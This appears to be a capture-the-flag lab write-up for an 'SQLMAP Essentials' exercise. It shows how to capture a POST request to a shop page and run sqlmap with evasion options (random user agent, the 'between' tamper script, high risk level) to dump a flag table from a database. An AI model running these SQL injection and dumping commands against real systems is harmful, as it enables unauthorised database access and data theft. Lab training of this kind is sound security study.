# SQLMAP Essentials

## Objectives 

You are given access to a web application with basic protection mechanisms...

What's the contents of table final_flag?

## Assessment

<img width="1557" height="621" alt="image" src="https://github.com/user-attachments/assets/f203f560-211d-4a08-a957-8e11e43c8db8" />
<img width="1358" height="569" alt="image" src="https://github.com/user-attachments/assets/d1ce2f20-1865-425e-a9ae-db89575201bb" />


Search for a `POST` request that can be abused while using the network tab: 

<img width="1718" height="567" alt="image" src="https://github.com/user-attachments/assets/4dff1f4d-4894-452e-9dc0-978e1a4fcf0f" />

<img width="1047" height="386" alt="image" src="https://github.com/user-attachments/assets/ee5c48e0-cadf-49d2-8f2f-8b9c6feadaf0" />

<img width="1919" height="387" alt="image" src="https://github.com/user-attachments/assets/6688613c-dc57-4e30-8ffe-e948bcc69f20" />

Select the request and copy the raw request headers and the raw request payload --> and save them into a file:

<img width="1407" height="556" alt="image" src="https://github.com/user-attachments/assets/2ccc6144-1eee-4fd6-b89f-ab9d23889c53" />

<img width="719" height="473" alt="image" src="https://github.com/user-attachments/assets/8c583e39-c86b-441a-ab57-792838da40a5" />

<img width="777" height="457" alt="image" src="https://github.com/user-attachments/assets/ccfebd84-dbc1-451d-b99c-f3656b3cafda" />

Put the copied headers into a file: 

```
$ cat req.txt 
POST /action.php HTTP/1.1
Host: 94.237.57.1:37138
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.57.1:37138/shop.html
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.57.1:37138
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=p2mr1j8mbo5m1s7lu9dksn4d5f
Sec-GPC: 1
Priority: u=0

{"id":1}
```

Run sqlmap with these options to retrieve the flag: 

```
sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
```
<img width="1768" height="601" alt="image" src="https://github.com/user-attachments/assets/0f8ea8cc-3290-4ba1-a2b8-48c4232fae5e" />


```
sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
```

<img width="1459" height="473" alt="image" src="https://github.com/user-attachments/assets/d5052e15-5ce1-4923-94ba-30ece24f9b99" />

---


















